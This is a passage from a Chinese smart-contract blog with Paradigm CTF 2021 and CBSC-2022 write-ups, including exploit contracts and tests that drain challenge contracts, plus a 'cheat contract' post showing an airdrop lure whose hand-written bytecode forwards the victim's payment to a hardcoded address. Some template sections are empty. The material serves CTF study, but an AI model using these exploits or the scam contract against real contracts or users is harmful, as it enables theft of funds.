先分析EternalStorage合约 这个合约在fallback函数中，通过汇编实现了EternalStorageAPI的所有函数，根据fallback中的逻辑，可以将EternalStorage合约的属性抽象出来，如下： 123456789101112131415contract EternalStorage &#123; address owner; address pendingOwner; // 类似一个mapping mapping(bytes32 =&gt; TokenInfo) tokens; struct TokenInfo &#123; bytes32 name; // 0 bytes32 owner; // 0 + 1 bytes32 approval; // 0 + 2 bytes32 metadata; // 0 + 3 &#125;&#125; 接着分析CryptoCollectiblesMarket合约 能从该合约取出 ETH 的只有sellCollectible()函数（withdrawFee()该函数无法被调用），解题关键肯定是存少取多。该函数要求tokenPrices[tokenId]&gt;0，所以只能通过mintCollectible()函数赋值，而且要求调用者为代币的所有者，该market被代币所有者授权。 话不多说，直接说重点。 可以注意到，在TokenInfo结构体中有一个metadata属性，这个属性很关键。可以知道每个tokenId的所在的位置为：slot tokenId + 0 = name, slot tokenId + 1 = owner, slot tokenId + 2 = approval, slot tokenId + 3 = metadata。 分析铸币之后tokenId对应结构体的变化： 123456// after mint// slot = tokenId+ 0 (name): &quot;My First Collectible&quot;,+ 1 (owner): owner+ 2 (approval): + 3 (metadata): 将手中的tokenId卖给market，该结构属性的变化： 要卖给market之前需要通过token的approve函数给market授权。 123456// after market sell// slot = tokenId+ 0 (name): &quot;My First Collectible&quot;,+ 1 (owner): market+ 2 (approval): 0+ 3 (metadata): 那么要如何实现”存一次钱取多次呢”？ 通过updateName(bytes32,bytes32)将刚刚卖出的tokenId给自己授权 1.1 调用该函数的前提要通过ensureTokenOwner(tokenId)，而在ensureTokenOwner(tokenId)函数中，检验的方法便是eq(caller(), sload(add(tokenId, 1)))，要求调用者caller，要和sload(add(tokenId, 1))该位置（approval）的值相等，如果在调用updateName函数的使用，传入的tokenId为tokenId+2那么会有一个很神奇的地方，ensureTokenOwner(tokenId)判断的位置为caller和sload(add(add(tokenId, 2), 1))该位置（metadata）的值相等。 1.2 所以重点来了！！！只要在铸币之后，卖币之前将metadata部分的值设为hacker自己，那么每次都要通过updataName(tokenId+2, hacker)，使approval的值，由0变成hacker。 1.3 此时就可以实现将卖出的币不通过market完成给自己授权的操作。 再看到Market的transferFrom函数，该函数的功能是将代币的所有权转移给某个账户，前提：该代币的所有者必须给调用者授权，在上一步中已经知道如何实现，不通过代币所有者直接完成授权操作（前提是实现修改代币的metadata部分）。所以便可以以approval的身份调用该函数成为tokenId的owner。 简单计算需要如何将market的balance掏空 12345678910// 已知 balance(market) = 50 ether// 通过 mintCollectibleFor 函数铸币需要被收取 (1 / 11)的手续分// 那么到账户手中的实际只有 (10 / 11)/* 计划取两次将钱取完，设铸币量为：x， 有： 50 + x = (10 / 11) * x * 2 化简得： (9 / 11) * x = 50 emmm，很不好算，我喜欢整数，x 取 66，则需要等式右边为54， 这里可以通过自毁合约强行给合约转钱，这样一来就好算了。*/ 综上，攻击思路为： 通过自毁合约，往market转4ETH； 通过mintCollectible合约获取tokenId（这样才可以修改metadata部分），并转入66 ether； 修改通过updateMetadata()修改metadata的值，再通过CryptoCollectibles的approve函数给market授权（为了成功执行sellCollectible()函数） 调用sellCollectible()函数，先拿出60ether 调用updataName(tokenId+2， hacker)，成为代币的被授权者 调用CryptoCollectibles.transferFrom(tokenId, market, hacker)，再次成为tokenId的所有者 最后授权market，再次执行sellCollectible()函数即可。 3. solve攻击合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869pragma solidity 0.7.0;import &quot;../../../src/Paradigm_CTF_2021/market/Setup.sol&quot;;contract MarketHacker_ &#123; EternalStorageAPI eternalStorage; CryptoCollectibles token; CryptoCollectiblesMarket market; Setup setup; constructor(address _setup) payable &#123; require(msg.value == 4 ether, &quot;You must pay 4 ether&quot;); setup = Setup(_setup); eternalStorage = setup.eternalStorage(); token = setup.token(); market = setup.market(); // 强制给market转钱，使其能够两次转完 new MarketHelper&#123;value:msg.value&#125;(address(market)); &#125; function pwn() public payable &#123; require(msg.value == 66 ether, &quot;You must pay 66 ether&quot;); // 1. mint tokenId for hacker bytes32 tokenId = market.mintCollectible&#123;value:msg.value&#125;(); // 2. set the metadata for the tokenId eternalStorage.updateMetadata(tokenId, address(this)); // 3. approve the market token.approve(tokenId, address(market)); // 4. sell the token market.sellCollectible(tokenId); // be the token&#x27;s owner beTokenOwner(tokenId); // 8. sell the token again market.sellCollectible(tokenId); // 9. judge is sloved require(setup.isSolved(), &quot;You don&#x27;t solve...&quot;); &#125; function beTokenOwner(bytes32 tokenId) internal &#123; // 5. be the token&#x27;s approval by updateName // slot tokenId + 2 == the location of approval eternalStorage.updateName( bytes32(uint(tokenId) + uint(2)), bytes32(uint(uint160(address(this)))) ); // 6. be the token&#x27;s owner by transferFrom token.transferFrom(tokenId, address(market), address(this)); // 7. approve the market token.approve(tokenId, address(market)); &#125; receive() external payable &#123;&#125; // must realize !!!&#125;contract MarketHelper &#123; constructor(address market) payable &#123; selfdestruct(payable(market)); &#125;&#125; 攻击合约测试 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity 0.7.0;pragma experimental ABIEncoderV2;import &quot;forge-std/Test.sol&quot;;import &quot;./MarketHacker_.sol&quot;;contract MarketHacker is Test &#123; Setup setup; MarketHacker_ hacker; function setUp() public &#123; setup = new Setup&#123;value:50 ether&#125;(); hacker = new MarketHacker_&#123;value:4 ether&#125;(address(setup)); &#125; function test_isSolved() external &#123; hacker.pwn&#123;value:66 ether&#125;(); assertEq(setup.isSolved(), true); &#125;&#125; 0x09-lockbox1. request 这道题要求将Entrypoint合约中的solved变量修改为true，即要求成功执行Entrypoint合约中的solve函数。 2. analysis 分析Entrypoint合约可知，这道题是要将Entrypoint,Stage1,Stage2,Stage3,Stage4,Stage5中的solve函数全部成功执行，而且calldata不变，也就是说使用一次calldata通过所有的solve。而调用的终止条件是 1234let next := sload(next_slot)if iszero(next) &#123; return(0, 0)&#125; 这将会在 Stage5 中满足。 在Stage5中规定了calldata的长度为 256bytes，所以只能在规定长度的calldata中通过所有“关卡”，慢慢拼凑出calldata。起始calldata为 123456780000000000000000000000000000000000000000000000000000000000000000 // 0x000000000000000000000000000000000000000000000000000000000000000000 // 0x200000000000000000000000000000000000000000000000000000000000000000 // 0x400000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc00000000000000000000000000000000000000000000000000000000000000000 // 0xe0 接下来逐一过关，拼凑出calldata 调用Entrypoint中的solve(bytes4 guess) 这个guess很好猜，坏随随机数，可以提前计算； (guess从高位截取)，此时的calldata为： 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]0000000000000000000000000000000000000000000000000000000 // 0x000000000000000000000000000000000000000000000000000000000000000000 // 0x200000000000000000000000000000000000000000000000000000000000000000 // 0x400000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc000000000000000000000000000000000000000000000000000000000 // 0xe0 调用Stage1中的 solve(uint8 v, bytes32 r, bytes32 s) 需要拿到0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf账户的私钥，并对keccak256(&quot;stage1&quot;)进行签名。 注意：0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf的私钥可以Google查到，私钥就是1，需要使用该私钥对keccak256(“stage1”)进行签名，这里要注意的是，不能采用以太坊的签名方式（即，在消息前加上\\x19Ethereum Signed Message:\\n32，在这里踩坑很久。。。） 使用python脚本计算v，r，s 123456789101112from eth_account import Accountfrom web3 import Web3 messagehash = Web3.keccak(text=&quot;stage1&quot;)print(&quot;message&#x27;s hash&quot;,messagehash.hex())privatekey =&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;signMessage = Account.signHash(message_hash=messagehash, private_key=privatekey) print(&quot;r = &quot;, Web3.to_hex(signMessage.r))print(&quot;s = &quot;, Web3.to_hex(signMessage.s))print(&quot;v = &quot;, Web3.to_hex(signMessage.v))print(&quot;signature = &quot;, Web3.to_hex(signMessage.signature)) 注意这里的 uint8 v参数从4bytes之后的第一个32bytes中取低 1byte， r在0x20，s在0x40 此时的calldata为： 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000001b // 0x00370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20 =&gt; r35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40 =&gt; s0000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc000000000000000000000000000000000000000000000000000000000 // 0xe0 调用Stage2中的solve(uint16 a, uint16 b) 这里需要使得a和b相加的结果发生上溢，编译器为0.4，所以要使得溢出很简单，即0x00后2bytes和0x20后2bytes的值相加发生溢出即可，这要求 a &gt; &#x3D;0xFFFF - 0xDD3B = 0x22CC。 所以需要修改 0x00 后2bytes的值，将其修改为0x991B 所以此时的calldata为 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000991b // 0x00370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b // 0x20 =&gt; r35b3f2e2ff583fed98ff00813ddc7eb17a0ebfc282c011946e2ccbaa9cd3ee67 // 0x40 =&gt; s0000000000000000000000000000000000000000000000000000000000000000 // 0x600000000000000000000000000000000000000000000000000000000000000000 // 0x800000000000000000000000000000000000000000000000000000000000000000 // 0xa00000000000000000000000000000000000000000000000000000000000000000 // 0xc000000000000000000000000000000000000000000000000000000000 // 0xe0 调用Stage3中的solve(uint idx, uint[4] memory keys, uint[4] memory lock) 4.1 这里要求keys[idx % 4] == lock[idx % 4]，此时的idx的值便是0x00所在位置的值，以0x1B结尾，如果对4去模，取模的结果只能等于3，即idx % 4 = 0，而在Stage5中的solve()限制calldata的长度，我们知道calldata后面全是用0补齐，所以即使我传入的calldata中不包括lock[3]，那么EVM会从后面的空闲位置取值，也就是取零，即lock[3]=0。所以，不能让v等于0x1B，如果让v等于0x1C的话，0x1c % 4 = 0，那么这个lock[0]在可控的calldata中。综上可知，求解的签名不对，所以需要重新求出签名。在现如今很多的工具库中，求签名的函数被封装好了的，但是可以去修改源码，更改secp256k1中的临时密钥，可以实现。 4.2 这里要求keys[i] &lt; keys[i + 1]，现如今的key[0] &lt; key[1]即r &lt; s，所以生成的签名要求v=28, r &lt; s。 4.3 这里要求(keys[j] - lock[j]) % 2 == 0，这里可以根据keys数组修改lock数组的值，使其的差为二的倍数，且keys[3]的值一定是偶数。 通过ethereumjs计算出符合要求的signature 1234567Message: stage1Message Hash: b6619a2d9d36a2acecba8e9d99c8444477624a46561077a675900f4af2c42c95Signature: &#123; v: 28, r: &#x27;219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f&#x27;, s: &#x27;64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7&#x27;&#125; 此时的calldata为 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000991c // 0x00219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0x20 =&gt; r keys[0]64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7 // 0x40 =&gt; s keys[1]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896 // 0x60 keys[2]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89a // 0x80 keys[3]219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0xa0 lock[0]0000000000000000000000000000000000000000000000000000000000000003 // 0xc0 lock[1]00000000000000000000000000000000000000000000000000000000 // 0xe0 lock[2] 调用Stage4中的solve(bytes32[6] choices, uint choice) 要求choices[choice % 6] == keccak256(abi.encodePacked(&quot;choose&quot;)，而choice的值对应lock[1]此时lock[1]%6==1，可以将lock[1]修改为3，那么lock[1]%6==3，所以此时的calldata为 1234567890xe0d20f73 // abi.encodeWithSignature(&quot;solve(bytes4)&quot;)[ guess ]000000000000000000000000000000000000000000000000000991c // 0x00219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0x20 =&gt; r keys[0]64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7 // 0x40 =&gt; s keys[1]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896 // 0x60 keys[2]e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89a // 0x80 keys[3]219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f // 0xa0 lock[0]0000000000000000000000000000000000000000000000000000000000000003 // 0xc0 lock[1]00000000000000000000000000000000000000000000000000000000 // 0xe0 lock[2] 最后还要注意函数调用的方式，要么通过ethersjs发送指定的calldata，要么通过汇编发送指定的calldata。 3. solve攻击合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./Interface.sol&quot;;contract LockboxHacker_ &#123; Setup setup; Entrypoint entrypoint; constructor(address _setup) &#123; setup = Setup(_setup); entrypoint = Entrypoint(setup.entrypoint()); &#125; function pwn() public &#123; // 1. calculate guess bytes4 guess = bytes4(blockhash(block.number - 1)); // 2. build calldata bytes memory calldata_ = abi.encodePacked( Entrypoint.solve.selector, // bytes4 abi.encodeWithSignature(&quot;solve(bytes4)&quot;) guess, bytes28(uint224(0x000000000000000000000000000000000000000000000000000991c)), bytes32(0x219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f), bytes32(0x64ebcb040f8b62a0f2ff148604f36ef756c3558cd54c2d008447e8119f2b45f7), bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896), bytes32(0xe201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89a), bytes32(0x219df4f90e49c25326119aebb09876e3ca5d0cbd1e60c23dee1be7a5d87e6b6f), bytes32(0x0000000000000000000000000000000000000000000000000000000000000003) ); // 3. call the Entrypoin&#x27;s solve() // 不能直接调用solve(), 因为这样就没有后面的calldata了，我们要发送原始的calldata // 这种做法似曾相识，我记得当时是用ethersjs做的 // 这里借鉴我同学的方法，通过内联汇编来发送原始的calldata(很牛皮) // address(entrypoint).call(calldata_); address point = address(entrypoint); assembly &#123; let size := mload(calldata_) pop(call(gas(), point, 0, add(calldata_,0x20), size, 0, 0)) //弹出返回值 &#125; // 4. judge is Solved require(setup.isSolved(), &quot;You don&#x27;t solve...&quot;); &#125;&#125; 攻击合约测试： 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./LockboxHacker_.sol&quot;;contract LockboxHacker is Test &#123; string constant path_SetUp = &quot;out/Setup.sol/Setup.json&quot;; Setup setup; LockboxHacker_ hacker; function setUp() public &#123; setup = Setup(deploy_Setup()); hacker = new LockboxHacker_(address(setup)); &#125; function test_isSolved() public &#123; hacker.pwn(); assertEq(setup.isSolved(), true); &#125; function deploy_Setup() internal returns (address _setup) &#123; bytes memory setup_bytycode = abi.encodePacked(vm.getCode(path_SetUp)); assembly &#123; _setup := create(0, add(setup_bytycode, 0x20), mload(setup_bytycode)) &#125; &#125;&#125; 0x0a-bank1. request 这题要求将bank的WETH代币掏空。 2. analysis 该题中能减少WETH余额的函数只有&#96;&#96;withdrawToken()函数，而执行的逻辑为：首先得有足够的钱，才可以从bank中取出，所以本题的的漏洞可以是通过该函数骗bank的钱。问题进而转变为如何使得mapping(address &#x3D;&gt; uint) balances&#96;该映射的值大于自己实际的存储金额。 看到结构体且在低版本中，我首先想到的是利用结构体的插槽覆盖，分析了下该方法不可行，因为Account storage account都是从映射accounts中取出来的，所以并不会存在插槽覆盖。 看到本题涉及了动态数组，且setAccountName(uint accountId, string name)函数是一个修改动态数组任意索引位置的值的函数。所以可以想办法使accounts数组的长度变为type(uint256)，分析可知withdrawToken()和closeLastAccount()函数都涉及了数组长度修改的操作，但是在withdrawToken()中token是自定义的，所以可以进行函数的外部调用，看到如下代码 123456789101112131415function withdrawToken(uint accountId, address token, uint amount) external &#123; require(accountId &lt; accounts[msg.sender].length, &quot;withdrawToken/bad-account&quot;); require(ERC20Like(token).balanceOf(address(this)) &gt;= amount, &quot;withdrawToken/low-sender-balance&quot;); // if the user has emptied their balance, decrement the number of unique tokens if (account.balances[token] == 0) &#123; account.uniqueTokens--; if (account.uniqueTokens == 0 &amp;&amp; accountId == lastAccount) &#123; accounts[msg.sender].length--; &#125; &#125; &#125; 仔细看这就是很明显的重入，先判断数组长度，执行外部调用，最后在更新数组的长度，这里完全可以在执行外部函数调用的时候调用withdrawToken()函数，从而可以通过&#96;&#96;require(accountId &lt; accounts[msg.sender].length, “withdrawToken&#x2F;bad-account”);&#96;断言。 这个balanceOf的重入有点难。。。直接借鉴大佬的：链接 将数组的长度设置为type(uint256)之后，接下来考虑的是覆盖。 12345678// 找到`accounts`的位置accounts_slot = keccak256(abi.encode(msg.sender,0x02));// 找到`Account[accountId]`的位置account_slot = keccak256(abi.encodePacked(accounts_slot)) + 3 * accountId;// 找到第n个Account.balances插槽的位置balances_slot = account_slot + 3 * accountId + 2;// 找到第n个Account的WETH对应的余额weth_slot = keccak256(abi.encode(address(WETH), balances_slot)) 就极度复杂。。。。。 3. solve攻击合约 1// 先留着吧 🤪剩下的题目以后水平上来了再来做~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Paradigm-CTF-2021","slug":"CTFS/Paradigm-CTF-2021","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2021/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Cheat contract","slug":"Experience/tips/骗子合约","date":"2023-10-13T07:47:10.000Z","updated":"2023-10-13T07:47:10.000Z","comments":true,"path":"2023/10/13/Experience/tips/骗子合约/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/13/Experience/tips/%E9%AA%97%E5%AD%90%E5%90%88%E7%BA%A6/","excerpt":"","text":"简介 这是一个蛮有意思的骗子合约，只要对外宣称只需要支付大于0.1ETH，便可以得到1ETH，是你，你会不会信🤪 骗子合约1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.16;contract Cheat &#123; /* runtimeCode =&gt; address(cheat).call&#123;value:address(this).balance&#125;(&quot;&quot;); call(g, a, v, in, insize, out, outsize); PUSH1 00 6000 PUSH1 00 6000 PUSH1 00 6000 PUSH1 00 6000 SELFBALANCE 47 PUSH20 Ab8483F64d9C6d1EcF9b849Ae677dD3315835cb2 73Ab8483F64d9C6d1EcF9b849Ae677dD3315835cb2 GAS 5A 5A CALL F1 */ constructor() &#123; bytes memory runtimeCode = hex&quot;60006000600060004773Ab8483F64d9C6d1EcF9b849Ae677dD3315835cb25AF1&quot;; assembly &#123; return(add(runtimeCode, 0x20), mload(runtimeCode)) &#125; &#125; // 空投 function airDrop() external payable &#123; require(msg.value &gt;= 0.1 ether, &quot;You only need pay 0.1 ether, than you can get 1 ether!!!!&quot;); payable(msg.sender).call&#123;value:1 ether&#125;(&quot;&quot;); &#125;&#125; 演示 首先cheat将合约部署好，并发布到网上 假以时日，一个靓仔发现了这个airdrop这个空投，心里想着0.1ETH换1WETH血赚，然后调用该函数 结果发现自己的账户并没有收到空投，cheat的账户反而增加了 0.1 ether","categories":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"},{"name":"tips","slug":"Experience/tips","permalink":"https://biyouqiuqiu.com/categories/Experience/tips/"}],"tags":[{"name":"tips","slug":"tips","permalink":"https://biyouqiuqiu.com/tags/tips/"}]},{"title":"CBSC-2022","slug":"CTFS/CBSC-2022/CBSC-2022","date":"2023-10-11T08:50:10.000Z","updated":"2023-10-11T08:50:10.000Z","comments":true,"path":"2023/10/11/CTFS/CBSC-2022/CBSC-2022/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/11/CTFS/CBSC-2022/CBSC-2022/","excerpt":"","text":"引言 📌 代码太多了,可以在GitHub找到:链接 0x00-TrusterLenderPool1. question 📌 掏空pool中的token0代币，成功执行Complete()函数。 2. analysis 这题的漏洞在于闪电贷函数中，borrower为任意地址，也可以是hacker地址，hacker可以实现receiveEther(uint256)函数，并在函数体中进行而已操作。闪电贷借钱之后必须要还钱才行，看到swap函数，该函数的换算是1:1的，即需要多少token0（token1）则需要支付等额的token（token0），只要在借到pool中全部token0的同时，拿去兑换等额的token1，此时pool中的token0的balance又回到balanceBefore，这样就可以通过最后的断言require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;)，简单来说就是实现了，使用pool中token0，换出了pool中的token1。最后再通过swap函数，将手中的token1兑换pool中的全部token0即可。 最离谱的还是授权操作，我只能说approve函数被改得面目全非，safeCheek修饰器要求uint160(tx.origin)&amp;0xffffff!=0xbeddC4||tx.origin==admin才能执行，可以通过grant函数覆盖成为admin，等好不容易进到approve之后，你会发现_allowances[spender][tx.origin] = amount，也就是说spender只能给tx.origin授权，tmd，所以授权是不可行的（其实可以尝试通过脚本计算一个0xbedc4结尾的账户，我没尝试过我觉得应该可行），只能换思路，grant函数可以修改任意slot的值，所以可以计算 _allowances[hancer][pool]的值，并给其赋值tx.origin&gt;10000即可，然后再调用approve修改slot3的值，使得hacker成为token的admin。调用grant会检查require(spender.code.length&gt;0&amp;&amp;spender.code.length&lt;10)，有spender自定义，所以可以编写一个runtimeCode长度符合要求的即可，这个不难实现。 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465contract TrusterLenderPoolHacker &#123; TrusterLenderPool pool; IERC20 token0; IERC20 token1; address helper; constructor(address _pool) &#123; pool = TrusterLenderPool(_pool); token0 = pool.token0(); token1 = pool.token1(); helper = address(new TrusterLenderPoolHelper()); &#125; /* complete address(this) approve pool of token0&amp;token1 */ function _pwn1() internal &#123; // 1. cal slot =&gt; _allowances[address(this)[pool] bytes32 slot_self_pool = keccak256(abi.encode(address(pool), keccak256(abi.encode(address(this), 1)))); // 2. set _allowances[address(this)[token0] == tx.origin &gt; 10000 token0.approve(helper, uint(slot_self_pool)); // 3. become token0&#x27;s admin token0.approve(helper, 3); // Similarly ===&gt; operate token1 token1.approve(helper, uint(slot_self_pool)); token1.approve(helper, 3); &#125; function pwn() external &#123; // address(this) approve pool _pwn1(); // call flashLoan pool.flashLoan(token0.balanceOf(address(pool)),address(this)); // use token1 to swap token0 pool.swap(address(token0), token1.balanceOf(address(this))); // slove the challenge pool.Complete(); &#125; function receiveEther(uint256 borrowAmount) external &#123; // use token0 to swap token1 // now token0.balanceOf(address(pool)) == balanceAfter pool.swap(address(token1), borrowAmount); &#125;&#125;// generate spender ---- spender.code.length == 4contract TrusterLenderPoolHelper &#123; constructor() &#123; assembly&#123; mstore(0x200, shl(240, 0x1030)) return(0x200, 4) &#125; &#125;&#125; 0x01-SVip1. question 📌 晋升supervip，成功调用isComplete() 2. analysis 这题漏洞在于，transferPoints函数，经典自己给自己转钱，赚多少余额加多少，利用这个漏洞，可以通过空投函数getPoint获取100个点，再每次给自己转SVip.points(hacker)-1重复四次即可完成。 3. solve攻击合约 123456789101112131415161718192021222324252627contract SVipHacker &#123; SVip svip; constructor(address _svip) public &#123; svip = SVip(_svip); &#125; function pwn() external &#123; // 1. get 100 points for (uint i; i &lt; 100; i++) &#123; svip.getPoint(); &#125; // 2. transfer to myself, points double, 100 =&gt; 200 =&gt; 400 =&gt; 800 =&gt; 1600 for (uint j; j &lt; 4; j++) &#123; svip.transferPoints(address(this), svip.points(address(this)) - 1); &#125; // 3. promote svip svip.promotionSVip(); // 4. judge is completed require(svip.isComplete(), &quot;You don&#x27;t complete...&quot;); &#125;&#125; 0x01. question 📌 2. analysis 3. solve攻击合约 1234567891011121314151617```### 0x0#### 1. question&gt; 📌#### 2. analysis&gt; #### 3. solve*攻击合约*```solidity 0x01. question 📌 2. analysis 3. solve攻击合约 1234567891011121314151617```### 0x0#### 1. question&gt; 📌#### 2. analysis&gt; #### 3. solve*攻击合约*```solidity 0x01. question 📌 2. analysis 3. solve攻击合约 1234567891011121314151617```### 0x0#### 1. question&gt; 📌#### 2. analysis&gt; #### 3. solve*攻击合约*```solidity 0x01. question 📌 2. analysis 3. solve攻击合约 1234567891011121314151617```### 0x0#### 1. question&gt; 📌#### 2. analysis&gt; #### 3. solve*攻击合约*```solidity","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"CBSC-2022","slug":"CTFS/CBSC-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/CBSC-2022/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"uing of opcode log","slug":"Basic_Knowledge/solidity/log1","date":"2023-10-06T14:47:10.000Z","updated":"2023-10-06T14:47:10.000Z","comments":true,"path":"2023/10/06/Basic_Knowledge/solidity/log1/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/06/Basic_Knowledge/solidity/log1/","excerpt":"","text":"前言 在刷chainflag-opcode-BoxGame发现这个很有趣，记录下。 Log1用法 log1(offset, size, topic)： offset: byte offset in the memory in bytes. size: byte size to copy. topic1: 32-byte value. 以 event NewValue(uint256)为例，offsize为 NewValue参数所在的位置，size为参数的长度，这里是 32bytes，topic1则是事件的hash即keccak256(abi.encodePacked(&quot;NewValue(uint256)&quot;)) 代码举例 123456789101112131415161718192021contract Logic &#123; event NewValue(uint newValue); function captureFlag() public &#123; uint256 value = 0x999999999999999999999999999999999999999999; bytes32 eventHash = keccak256(abi.encodePacked(&quot;NewValue(uint256)&quot;)); assembly &#123; // To emit an event we first need to store the value in memory. mstore(0xa0, value) // Now to emit the event we use the log1 opcode. // First arg is the memory address, second is the number of bytes and the third is the hashed event signature log1(0xa0, 0x20, eventHash) &#125; &#125;&#125; 结果：成功触发事件 触发其他类型的也行，如下 1234567891011121314151617pragma solidity ^0.8.0;contract Logic &#123; event SendFlag(address); function captureFlag() public &#123; address owner = msg.sender; bytes32 eventHash = keccak256(abi.encodePacked(&quot;SendFlag(address)&quot;)); assembly &#123; mstore(0xa0, owner) log1(0xa0, 0x20, eventHash) &#125; &#125;&#125; 同理，也可以触发多个参数的event 12345678910111213141516171819pragma solidity ^0.8.0;contract Logic &#123; event NewValue(address, uint); function captureFlag() public &#123; address owner = msg.sender; uint256 value = 0x999999999999999999999999999999999999999999; bytes32 eventHash = keccak256(abi.encodePacked(&quot;NewValue(address,uint256)&quot;)); assembly &#123; mstore(0x80, owner) mstore(0xa0, value) log1(0x80, 0x40, eventHash) &#125; &#125;&#125; 📌 注：size一定要是32byres的倍数，即使event SendFlag(address)中的参数是20bytes，但是也要将长度的写成0x20，其实这里只要是32的bytes即可，0x40也ok的。 奇怪的事 比如我在A合约中并没定义某个事件，而是在B合约中定义了，在A合约也可以触发事件，如下所示： 但是，如果将 Proxy中的合约 event注视掉，则不会触发该事件，就感觉很神奇。 如果不使用内联汇编的话，这里很明显会报错，如下：","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"creationcode & runtimecode","slug":"Basic_Knowledge/solidity/bytecode","date":"2023-10-04T14:47:10.000Z","updated":"2023-10-04T14:47:10.000Z","comments":true,"path":"2023/10/04/Basic_Knowledge/solidity/bytecode/","link":"","permalink":"https://biyouqiuqiu.com/2023/10/04/Basic_Knowledge/solidity/bytecode/","excerpt":"","text":"bytecode， initcode，deploycode bytecode &#x3D; type(Contract_Name).creationCode &#x3D; init code + runtimeCode type(Contract_Name).runtimeCode &#x3D; runtimeCode extcodecopy &#x3D;&gt; runtimecode 案例好文章推荐article1 metadata： article2","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"MetaTrust CTF","slug":"CTFS/MetaTrust CTF/MetaTrust CTF","date":"2023-09-17T03:50:10.000Z","updated":"2023-09-17T03:50:10.000Z","comments":true,"path":"2023/09/17/CTFS/MetaTrust CTF/MetaTrust CTF/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/17/CTFS/MetaTrust%20CTF/MetaTrust%20CTF/","excerpt":"","text":"前言 比赛链接：LINK 代码仓库：LINK greeterVault1. 要求 成功调用SetUp的isSolved函数 2. 分析 